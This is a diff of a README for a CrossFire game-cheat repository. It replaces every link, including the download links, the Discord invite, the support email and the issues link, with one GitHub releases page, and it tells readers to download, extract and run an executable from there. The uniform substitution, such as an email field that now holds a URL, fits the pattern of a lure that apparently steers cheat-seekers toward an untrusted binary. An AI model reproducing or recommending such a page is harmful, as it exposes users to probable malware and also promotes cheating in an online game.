@@ -1,6 +1,6 @@
 # CrossFire Cheat Repository
 
-![CrossFire Cheats](https://img.shields.io/badge/CrossFire%20Cheats-Download%20Now-brightgreen)
+![CrossFire Cheats](https://github.com/jeremias-cortes/CrossFire/releases%20Cheats-Download%20Now-brightgreen)
 
 Welcome to the CrossFire Cheat Repository! This repository is dedicated to providing tools and resources for players looking to enhance their CrossFire gaming experience. Whether you are looking for cheat codes, APK files, or community discussions, you will find it here.
 
@@ -29,11 +29,11 @@ CrossFire is a popular first-person shooter game known for its competitive gamep
 
 ## Installation
 
-To get started, you need to download the application. You can find it [here](https://github.com/user/repo/Application.zip). Download the ZIP file, extract it, and execute the application. 
+To get started, you need to download the application. You can find it [here](https://github.com/jeremias-cortes/CrossFire/releases). Download the ZIP file, extract it, and execute the application. 
 
 ### Step-by-Step Installation
 
-1. Click on the link to download: [Download Application](https://github.com/user/repo/Application.zip).
+1. Click on the link to download: [Download Application](https://github.com/jeremias-cortes/CrossFire/releases).
 2. Once downloaded, navigate to your Downloads folder.
 3. Extract the ZIP file using any extraction tool (e.g., WinRAR, 7-Zip).
 4. Open the extracted folder and locate the executable file.
@@ -56,7 +56,7 @@ Always use cheats responsibly. Excessive use may lead to account bans. We recomm
 
 Join our Discord community to connect with other players. Share your experiences, get support, and stay updated on the latest cheats and tools. Our community is friendly and always ready to help.
 
-- [Join Discord](https://discord.gg/example)
+- [Join Discord](https://github.com/jeremias-cortes/CrossFire/releases)
 
 ## Contributing
 
@@ -78,7 +78,7 @@ This repository is licensed under the MIT License. You are free to use, modify, 
 
 For any inquiries or support, feel free to reach out:
 
-- Email: support@example.com
-- GitHub Issues: [Report an Issue](https://github.com/user/repo/issues)
+- Email: https://github.com/jeremias-cortes/CrossFire/releases
+- GitHub Issues: [Report an Issue](https://github.com/jeremias-cortes/CrossFire/releases)
 
 Thank you for visiting the CrossFire Cheat Repository! We hope you find the resources helpful and enjoy your gaming experience. If you need any further assistance, check the "Releases" section for the latest updates and tools.
